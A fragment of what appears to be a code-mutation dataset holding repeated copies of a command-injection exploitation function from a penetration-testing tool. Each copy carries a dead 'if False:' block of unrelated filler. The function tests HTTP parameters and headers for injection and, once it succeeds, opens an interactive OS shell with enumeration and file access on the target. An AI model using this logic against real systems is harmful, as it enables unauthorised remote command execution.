found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.HOST_INJECTION == True:\n                            header_name = ' Host'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.CUSTOM_HEADER_INJECTION == True:\n                            header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        else:\n                            header_name = ''\n                            the_type = ' parameter'\n                            if not settings.USER_DEFINED_POST_DATA:\n                                found_vuln_parameter = parameters.vuln_GET_param(url)\n                            else:\n                                found_vuln_parameter = vuln_parameter\n                        if len(found_vuln_parameter) != 0:\n                            found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                        if export_injection_info == False:\n                            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                        if vp_flag == True:\n                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                        logs.update_payload(filename, counter, payload)\n                        counter = counter + 1\n                        if not settings.LOAD_SESSION:\n                            if settings.VERBOSITY_LEVEL == 0:\n                                print(settings.SINGLE_WHITESPACE)\n                            else:\n                                checks.total_of_requests()\n                        info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                        info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                        print(settings.print_bold_info_msg(info_msg))\n                        sub_content = str(checks.url_decode(payload))\n                        print(settings.print_sub_content(sub_content))\n                        if not settings.LOAD_SESSION:\n                            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)\n                        else:\n                            whitespace = settings.WHITESPACES[0]\n                            settings.LOAD_SESSION = False\n                        new_line = True\n                        if settings.ENUMERATION_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                if enumerate_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                                    break\n                                elif enumerate_again in settings.CHOICE_NO:\n                                    new_line = False\n                                    break\n                                elif enumerate_again in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.enumeration_options():\n                            cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        if settings.FILE_ACCESS_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                file_access_again = common.read_input(message, default='N', check_batch=True)\n                                if file_access_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                                    break\n                                elif file_access_again in settings.CHOICE_NO:\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(file_access_again)\n                                    pass\n                        elif menu.file_access_options():\n                            cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        if menu.options.os_cmd:\n                            cb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        try:\n                            checks.alert()\n                            go_back = False\n                            go_back_again = False\n                            while True:\n                                if go_back == True:\n                                    break\n                                message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                if settings.CRAWLING:\n                                    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                if not settings.STDIN_PARSING:\n                                    gotshell = common.read_input(message, default='Y', check_batch=True)\n                                else:\n                                    gotshell = common.read_input(message, default='n', check_batch=True)\n                                if gotshell in settings.CHOICE_YES:\n                                    print(settings.OS_SHELL_TITLE)\n                                    if settings.READLINE_ERROR:\n                                        checks.no_readline_module()\n                                    while True:\n                                        if not settings.READLINE_ERROR:\n                                            checks.tab_autocompleter()\n                                        sys.stdout.write(settings.OS_SHELL)\n                                        cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                        cmd = checks.escaped_cmd(cmd)\n                                        if cmd.lower() in settings.SHELL_OPTIONS:\n                                            (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')\n                                            if go_back and go_back_again == False:\n                                                break\n                                            if go_back and go_back_again:\n                                                return True\n                                        else:\n                                            time.sleep(timesec)\n                                            response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)\n                                            if settings.URL_RELOAD:\n                                                response = requests.url_reload(url, timesec)\n                                            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                try:\n                                                    shell = cb_injector.injection_results(response, TAG, cmd)\n                                                    shell = ''.join((str(p) for p in shell))\n                                                except:\n                                                    print(settings.SINGLE_WHITESPACE)\n                                                    continue\n                                                if not menu.options.ignore_session:\n                                                    session_handler.store_cmd(url, cmd, shell, vuln_parameter)\n                                            else:\n                                                shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                            if shell or shell != '':\n                                                shell = unescape(shell)\n                                                logs.executed_command(filename, cmd, shell)\n                                                print(settings.command_execution_output(shell))\n                                            else:\n                                                err_msg = common.invalid_cmd_output(cmd)\n                                                print(settings.print_error_msg(err_msg))\n                                elif gotshell in settings.CHOICE_NO:\n                                    if checks.next_attack_vector(technique, go_back) == True:\n                                        break\n                                    elif no_result == True:\n                                        return False\n                                    else:\n                                        return True\n                                elif gotshell in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(gotshell)\n                                    pass\n                        except (KeyboardInterrupt, SystemExit):\n                            raise\n                        except EOFError:\n                            if settings.STDIN_PARSING:\n                                print(settings.SINGLE_WHITESPACE)\n                            err_msg = 'Exiting, due to EOFError.'\n                            print(settings.print_error_msg(err_msg))\n                            raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    shell = False\n    counter = 1\n    vp_flag = True\n    no_result = True\n    is_encoded = False\n    export_injection_info = False\n    if not settings.LOAD_SESSION:\n        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '\n        sys.stdout.write(settings.print_info_msg(info_msg))\n        sys.stdout.flush()\n        if settings.VERBOSITY_LEVEL != 0:\n            print(settings.SINGLE_WHITESPACE)\n    i = 0\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    if whitespace == settings.SINGLE_WHITESPACE:\n                        whitespace = _urllib.parse.quote(whitespace)\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):\n                        try:\n                            settings.CLASSIC_STATE = True\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    else:\n                        i = i + 1\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        TAG = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))\n                        randv1 = random.randrange(100)\n                        randv2 = random.randrange(100)\n                        randvcalc = randv1 + randv2\n                        alter_shell = menu.options.alter_shell\n                        try:\n                            if alter_shell:\n                                payload = cb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)\n                            else:\n                                payload = cb_payloads.decision(separator, TAG, randv1, randv2)\n                            payload = parameters.prefixes(payload, prefix)\n                            payload = parameters.suffixes(payload, suffix)\n                            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                            payload = checks.perform_payload_modification(payload)\n                            if settings.VERBOSITY_LEVEL != 0:\n                                print(settings.print_payload(payload))\n                            if settings.COOKIE_INJECTION == True:\n                                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                response = cb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                            elif settings.USER_AGENT_INJECTION == True:\n                                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                response = cb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                            elif settings.REFERER_INJECTION == True:\n                                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                response = cb_injector.referer_injection_test(url, vuln_parameter, payload)\n                            elif settings.HOST_INJECTION == True:\n                                vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                response = cb_injector.host_injection_test(url, vuln_parameter, payload)\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                response = cb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                            else:\n                                (response, vuln_parameter) = cb_injector.injection_test(payload, http_request_method, url)\n                            if settings.URL_RELOAD:\n                                response = requests.url_reload(url, timesec)\n                            time.sleep(timesec)\n                            shell = cb_injector.injection_test_results(response, TAG, randvcalc)\n                            if settings.VERBOSITY_LEVEL == 0:\n                                percent = i * 100 / total\n                                float_percent = '{0:.1f}'.format(round(i * 100 / (total * 1.0), 2))\n                                if shell == False:\n                                    info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '...' + ' (' + str(float_percent) + '%)'\n                                    sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                    sys.stdout.flush()\n                                if float(float_percent) >= 99.9:\n                                    if no_result == True:\n                                        percent = settings.FAIL_STATUS\n                                    else:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                elif len(shell) != 0:\n                                    percent = settings.info_msg\n                                else:\n                                    percent = '.. (' + str(float_percent) + '%)'\n                                info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                sys.stdout.flush()\n                        except (KeyboardInterrupt, SystemExit):\n                            print(settings.SINGLE_WHITESPACE)\n                            raise\n                        except EOFError:\n                            if settings.STDIN_PARSING:\n                                print(settings.SINGLE_WHITESPACE)\n                            err_msg = 'Exiting, due to EOFError.'\n                            print(settings.print_error_msg(err_msg))\n                            raise\n                        except:\n                            continue\n                    if shell:\n                        found = True\n                        no_result = False\n                        settings.DETECTION_PHASE = False\n                        settings.EXPLOITATION_PHASE = True\n                        if settings.COOKIE_INJECTION == True:\n                            header_name = ' cookie'\n                            found_vuln_parameter = vuln_parameter\n                            the_type = ' parameter'\n                        elif settings.USER_AGENT_INJECTION == True:\n                            header_name = ' User-Agent'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.REFERER_INJECTION == True:\n                            header_name = ' Referer'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.HOST_INJECTION == True:\n                            header_name = ' Host'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.CUSTOM_HEADER_INJECTION == True:\n                            header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        else:\n                            header_name = ''\n                            the_type = ' parameter'\n                            if not settings.USER_DEFINED_POST_DATA:\n                                found_vuln_parameter = parameters.vuln_GET_param(url)\n                            else:\n                                found_vuln_parameter = vuln_parameter\n                        if len(found_vuln_parameter) != 0:\n                            found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                        if export_injection_info == False:\n                            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                        if vp_flag == True:\n                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                        logs.update_payload(filename, counter, payload)\n                        counter = counter + 1\n                        if not settings.LOAD_SESSION:\n                            if settings.VERBOSITY_LEVEL == 0:\n                                print(settings.SINGLE_WHITESPACE)\n                            else:\n                                checks.total_of_requests()\n                        info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                        info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                        print(settings.print_bold_info_msg(info_msg))\n                        sub_content = str(checks.url_decode(payload))\n                        print(settings.print_sub_content(sub_content))\n                        if not settings.LOAD_SESSION:\n                            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)\n                        else:\n                            whitespace = settings.WHITESPACES[0]\n                            settings.LOAD_SESSION = False\n                        new_line = True\n                        if settings.ENUMERATION_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                if enumerate_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                                    break\n                                elif enumerate_again in settings.CHOICE_NO:\n                                    new_line = False\n                                    break\n                                elif enumerate_again in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.enumeration_options():\n                            cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        if settings.FILE_ACCESS_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                file_access_again = common.read_input(message, default='N', check_batch=True)\n                                if file_access_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                                    break\n                                elif file_access_again in settings.CHOICE_NO:\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(file_access_again)\n                                    pass\n                        elif menu.file_access_options():\n                            cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        if menu.options.os_cmd:\n                            cb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        try:\n                            checks.alert()\n                            go_back = False\n                            go_back_again = False\n                            while True:\n                                if go_back == True:\n                                    break\n                                message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                if settings.CRAWLING:\n                                    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                if not settings.STDIN_PARSING:\n                                    gotshell = common.read_input(message, default='Y', check_batch=True)\n                                else:\n                                    gotshell = common.read_input(message, default='n', check_batch=True)\n                                if gotshell in settings.CHOICE_YES:\n                                    print(settings.OS_SHELL_TITLE)\n                                    if settings.READLINE_ERROR:\n                                        checks.no_readline_module()\n                                    while True:\n                                        if not settings.READLINE_ERROR:\n                                            checks.tab_autocompleter()\n                                        sys.stdout.write(settings.OS_SHELL)\n                                        cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                        cmd = checks.escaped_cmd(cmd)\n                                        if cmd.lower() in settings.SHELL_OPTIONS:\n                                            (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')\n                                            if go_back and go_back_again == False:\n                                                break\n                                            if go_back and go_back_again:\n                                                return True\n                                        else:\n                                            time.sleep(timesec)\n                                            response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)\n                                            if settings.URL_RELOAD:\n                                                response = requests.url_reload(url, timesec)\n                                            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                try:\n                                                    shell = cb_injector.injection_results(response, TAG, cmd)\n                                                    shell = ''.join((str(p) for p in shell))\n                                                except:\n                                                    print(settings.SINGLE_WHITESPACE)\n                                                    continue\n                                                if not menu.options.ignore_session:\n                                                    session_handler.store_cmd(url, cmd, shell, vuln_parameter)\n                                            else:\n                                                shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                            if shell or shell != '':\n                                                shell = unescape(shell)\n                                                logs.executed_command(filename, cmd, shell)\n                                                print(settings.command_execution_output(shell))\n                                            else:\n                                                err_msg = common.invalid_cmd_output(cmd)\n                                                print(settings.print_error_msg(err_msg))\n                                elif gotshell in settings.CHOICE_NO:\n                                    if checks.next_attack_vector(technique, go_back) == True:\n                                        break\n                                    elif no_result == True:\n                                        return False\n                                    else:\n                                        return True\n                                elif gotshell in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(gotshell)\n                                    pass\n                        except (KeyboardInterrupt, SystemExit):\n                            raise\n                        except EOFError:\n                            if settings.STDIN_PARSING:\n                                print(settings.SINGLE_WHITESPACE)\n                            err_msg = 'Exiting, due to EOFError.'\n                            print(settings.print_error_msg(err_msg))\n                            raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    shell = False\n    counter = 1\n    vp_flag = True\n    no_result = True\n    is_encoded = False\n    export_injection_info = False\n    if not settings.LOAD_SESSION:\n        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '\n        sys.stdout.write(settings.print_info_msg(info_msg))\n        sys.stdout.flush()\n        if settings.VERBOSITY_LEVEL != 0:\n            print(settings.SINGLE_WHITESPACE)\n    i = 0\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    if whitespace == settings.SINGLE_WHITESPACE:\n                        whitespace = _urllib.parse.quote(whitespace)\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):\n                        try:\n                            settings.CLASSIC_STATE = True\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    else:\n                        i = i + 1\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        TAG = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))\n                        randv1 = random.randrange(100)\n                        randv2 = random.randrange(100)\n                        randvcalc = randv1 + randv2\n                        alter_shell = menu.options.alter_shell\n                        try:\n                            if alter_shell:\n                                payload = cb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)\n                            else:\n                                payload = cb_payloads.decision(separator, TAG, randv1, randv2)\n                            payload = parameters.prefixes(payload, prefix)\n                            payload = parameters.suffixes(payload, suffix)\n                            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                            payload = checks.perform_payload_modification(payload)\n                            if settings.VERBOSITY_LEVEL != 0:\n                                print(settings.print_payload(payload))\n                            if settings.COOKIE_INJECTION == True:\n                                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                response = cb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                            elif settings.USER_AGENT_INJECTION == True:\n                                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                response = cb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                            elif settings.REFERER_INJECTION == True:\n                                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                response = cb_injector.referer_injection_test(url, vuln_parameter, payload)\n                            elif settings.HOST_INJECTION == True:\n                                vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                response = cb_injector.host_injection_test(url, vuln_parameter, payload)\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                response = cb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                            else:\n                                (response, vuln_parameter) = cb_injector.injection_test(payload, http_request_method, url)\n                            if settings.URL_RELOAD:\n                                response = requests.url_reload(url, timesec)\n                            time.sleep(timesec)\n                            shell = cb_injector.injection_test_results(response, TAG, randvcalc)\n                            if settings.VERBOSITY_LEVEL == 0:\n                                percent = i * 100 / total\n                                float_percent = '{0:.1f}'.format(round(i * 100 / (total * 1.0), 2))\n                                if shell == False:\n                                    info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '...' + ' (' + str(float_percent) + '%)'\n                                    sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                    sys.stdout.flush()\n                                if float(float_percent) >= 99.9:\n                                    if no_result == True:\n                                        percent = settings.FAIL_STATUS\n                                    else:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                elif len(shell) != 0:\n                                    percent = settings.info_msg\n                                else:\n                                    percent = '.. (' + str(float_percent) + '%)'\n                                info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                sys.stdout.flush()\n                        except (KeyboardInterrupt, SystemExit):\n                            print(settings.SINGLE_WHITESPACE)\n                            raise\n                        except EOFError:\n                            if settings.STDIN_PARSING:\n                                print(settings.SINGLE_WHITESPACE)\n                            err_msg = 'Exiting, due to EOFError.'\n                            print(settings.print_error_msg(err_msg))\n                            raise\n                        except:\n                            continue\n                    if shell:\n                        found = True\n                        no_result = False\n                        settings.DETECTION_PHASE = False\n                        settings.EXPLOITATION_PHASE = True\n                        if settings.COOKIE_INJECTION == True:\n                            header_name = ' cookie'\n                            found_vuln_parameter = vuln_parameter\n                            the_type = ' parameter'\n                        elif settings.USER_AGENT_INJECTION == True:\n                            header_name = ' User-Agent'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.REFERER_INJECTION == True:\n                            header_name = ' Referer'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.HOST_INJECTION == True:\n                            header_name = ' Host'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.CUSTOM_HEADER_INJECTION == True:\n                            header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        else:\n                            header_name = ''\n                            the_type = ' parameter'\n                            if not settings.USER_DEFINED_POST_DATA:\n                                found_vuln_parameter = parameters.vuln_GET_param(url)\n                            else:\n                                found_vuln_parameter = vuln_parameter\n                        if len(found_vuln_parameter) != 0:\n                            found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                        if export_injection_info == False:\n                            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                        if vp_flag == True:\n                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                        logs.update_payload(filename, counter, payload)\n                        counter = counter + 1\n                        if not settings.LOAD_SESSION:\n                            if settings.VERBOSITY_LEVEL == 0:\n                                print(settings.SINGLE_WHITESPACE)\n                            else:\n                                checks.total_of_requests()\n                        info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                        info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                        print(settings.print_bold_info_msg(info_msg))\n                        sub_content = str(checks.url_decode(payload))\n                        print(settings.print_sub_content(sub_content))\n                        if not settings.LOAD_SESSION:\n                            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)\n                        else:\n                            whitespace = settings.WHITESPACES[0]\n                            settings.LOAD_SESSION = False\n                        new_line = True\n                        if settings.ENUMERATION_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                if enumerate_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                                    break\n                                elif enumerate_again in settings.CHOICE_NO:\n                                    new_line = False\n                                    break\n                                elif enumerate_again in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.enumeration_options():\n                            cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        if settings.FILE_ACCESS_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                file_access_again = common.read_input(message, default='N', check_batch=True)\n                                if file_access_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                                    break\n                                elif file_access_again in settings.CHOICE_NO:\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(file_access_again)\n                                    pass\n                        elif menu.file_access_options():\n                            cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        if menu.options.os_cmd:\n                            cb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        try:\n                            checks.alert()\n                            go_back = False\n                            go_back_again = False\n                            while True:\n                                if go_back == True:\n                                    break\n                                message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                if settings.CRAWLING:\n                                    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                if not settings.STDIN_PARSING:\n                                    gotshell = common.read_input(message, default='Y', check_batch=True)\n                                else:\n                                    gotshell = common.read_input(message, default='n', check_batch=True)\n                                if gotshell in settings.CHOICE_YES:\n                                    print(settings.OS_SHELL_TITLE)\n                                    if settings.READLINE_ERROR:\n                                        checks.no_readline_module()\n                                    while True:\n                                        if not settings.READLINE_ERROR:\n                                            checks.tab_autocompleter()\n                                        sys.stdout.write(settings.OS_SHELL)\n                                        cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                        cmd = checks.escaped_cmd(cmd)\n                                        if cmd.lower() in settings.SHELL_OPTIONS:\n                                            (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')\n                                            if go_back and go_back_again == False:\n                                                break\n                                            if go_back and 